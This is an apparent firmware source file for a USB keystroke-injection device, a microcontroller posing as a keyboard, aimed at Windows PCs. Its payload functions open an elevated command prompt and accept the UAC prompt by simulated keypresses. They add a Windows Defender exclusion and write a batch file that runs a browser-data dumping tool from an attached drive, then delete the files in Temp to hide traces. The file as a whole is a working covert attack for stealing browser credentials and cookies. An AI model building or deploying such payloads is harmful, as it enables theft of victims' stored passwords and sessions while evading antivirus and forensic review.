#include "exescript.h"

USBHIDKeyboard Keyboard;
TaskParameters task_params(" ", 5, false);
SemaphoreHandle_t write_complete_semaphore;
TaskHandle_t write_task_handle = nullptr;

// Actual Task Function
void write_task_wrapper(void *parameters)
{
    while (true)
    {
        // Wait to be resumed
        vTaskSuspend(NULL);

        vTaskDelay(pdMS_TO_TICKS(10));
        write(task_params.str, task_params.del, task_params.enter);

        // Signal completion
        xSemaphoreGive(write_complete_semaphore);
    }
}

// Initialise the Writing Task
void create_write_task()
{
    xTaskCreatePinnedToCore(
        write_task_wrapper,
        "write_task_name",
        14000, // Keeping big stack size to prevent crashes
        nullptr,
        configMAX_PRIORITIES - 1, // Max Priority
        &write_task_handle,       // Task handle
        1                         // Pinned to Core 1
    );
}

void write_task(const char *str, const int del, bool enter = false)
{
    task_params.str = str;
    task_params.del = del;
    task_params.enter = enter;

    blink(true);

    // Resume Task if handle is available
    if (write_task_handle != nullptr)
    {
        vTaskResume(write_task_handle);
    }

    // Wait for the writing task t  o complete
    if (xSemaphoreTake(write_complete_semaphore, portMAX_DELAY) == pdTRUE)
    {
        blink(false);
    }
}

// Count string length
int count_len(const char *str)
{
    int len = 0;
    while (*str != '\0')
    {
        len++;
        str++;
    }
    return len;
}

void write(const char *str, const int del, bool enter)
{
    int len = count_len(str);
    for (int i = 0; i < len; i++)
    {
        Keyboard.write(str[i]);
        vTaskDelay(pdMS_TO_TICKS(del)); // Adjust the delay as needed
    }
    if (enter)
    {
        Keyboard.write(KEY_RETURN);
    }
}

// Press WIN+R, open cmd, say hello world
void open_elevated_cmd()
{
    Keyboard.pressRaw(0xE3); // WINDOWS KEY
    Keyboard.pressRaw(0x15); // R KEY
    Keyboard.releaseAll();
    delay(1000);
    write_task(R"(powershell -command "Start-Process cmd.exe -Verb RunAs")", 30, true);
    delay(1000);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.write(KEY_LEFT_ARROW);
    delay(1000);
    Keyboard.write(KEY_RETURN);
    delay(1000);
}

// Remove traces from 'C:\Windows\Temp\'
void clear_trace()
{
    open_elevated_cmd();
    delay(100);
    write_task("CD ..", 5, true);
    write_task(R"(powershell -Command "Remove-Item 'C:/Windows/Temp/temp*' -Recurse -Force")", 5, true);
    delay(2000);
    write_task("exit", 5, true);
}

// Open Elevated Command Prompt, create a batch file
// Note - This code adds the filename to exception of Windows Defender List
void payload()
{
    open_elevated_cmd();
    const char start[] = R"(CD /d C:/Windows/Temp
mkdir temp
cd temp
rem/ > execute.bat
notepad execute.bat
)";
    write_task(start, 30, true);
    delay(2000);
    const char data[] = R"(@echo off
setlocal enabledelayedexpansion
TIMEOUT /t 10 /nobreak
powershell -Command Add-MpPreference -ExclusionPath "D:\hack-browser-data-windows-64bit.exe"
for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
if exist "%%d:\" (
    if exist "%%d:\find_temp_check.txt" (
            echo "find_temp_check.txt" found in %%d:\
        cd /d "%%d:\"
            hack-browser-data-windows-64bit.exe  
        ) 
    )
)
powershell -Command "Remove-Item 'C:/Windows/Temp/temp*' -Recurse -Force
TIMEOUT /t 3 /nobreak
exit
)";
    write_task(data, 15, false);
    delay(1000);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.write('s'); // save the file
    Keyboard.release('s');
    Keyboard.press('w'); // remove notepad traces
    Keyboard.releaseAll();
    delay(800);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();
    delay(1200);
    Keyboard.write(KEY_RETURN);
    delay(2000);
}

// Initialize USB connection
void setup_usb()
{
    if (USB.begin())
    {
        delay(200); // Give it time to start
        Keyboard.begin();
        write_complete_semaphore = xSemaphoreCreateBinary();
        delay(200);
        create_write_task();
        delay(50);
    }
}
